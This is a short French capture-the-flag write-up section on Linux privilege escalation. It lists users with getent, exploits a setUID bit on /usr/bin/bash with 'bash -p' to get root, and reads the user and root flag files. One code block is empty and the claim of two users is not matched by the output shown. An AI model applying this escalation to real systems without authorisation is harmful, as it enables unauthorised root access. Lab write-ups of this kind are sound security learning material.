## Escalade de privilège - Enumération des utilisateurs sys

```bash
-bash-5.1$ getent passwd | grep -i bash

usuario:x:1000:1000::/home/usuario:/bin/bash
-bash-5.1$
```

nous avons 2 utilisateurs system, donc nous allons essayer de trouver un moyen pour faire le mouvement horizontal et escaler au compte root

```bash

```

le programme `bash` a un `setUID` se qui nous permettra d'escaler a l'utilisateur `root` 

```
/usr/bin/bash -p
```


```bash
-bash-5.1$ /usr/bin/bash -p
bash-5.1# id
uid=1000(usuario) gid=1000(usuario) euid=0(root) groups=1000(usuario)
bash-5.1# 
```

nous somme root et nous allons lire les flags

```bash
bash-5.1# cat /home/usuario/user.txt /root/root.txt
```
